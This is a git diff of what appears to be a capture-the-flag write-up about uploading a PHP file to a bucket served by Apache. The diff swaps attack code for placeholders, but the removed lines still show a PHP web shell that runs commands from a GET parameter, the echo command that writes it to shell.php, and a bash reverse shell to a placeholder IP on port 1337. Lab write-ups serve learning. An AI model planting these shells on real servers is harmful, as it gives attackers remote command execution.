@@ -117,14 +117,15 @@ We see .htaccess: suggests Apache-based webservers.
 So the idea now is to upload a PHP code to the bucket. Then when we visit the webpage: the server will execute
 this code:
 
-<?php system($_GET["cmd"]); ?>
+<removed code due to security issues on local device; check the git changes>
 
 The idea is that:
 The attacker sends a GET request like http://example.com/script.php?cmd=ls, the server will execute the
 ls command and return the output to the attacker
 
 We have to first create the PHP file.
-Since it is a one-liner, we can do it in the terminal: echo '<?php system($_GET["cmd"]); ?>' > shell.php
+Since it is a one-liner, we can do it in the terminal:
+<removed code due to security issues on local device; check the git changes>
 
 This creates a file "shell.php".
 
@@ -156,8 +157,7 @@ Then we can make the server run it by connecting it to our machine and executing
 We use a shell script this time: to create > touch shell.sh
 Then we edit the file:
 
-#!/bin/bash
-bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
+<removed code due to security issues on local device; check the git changes>
 
 The first line means that Bash interpreter should be used to execute the script
 
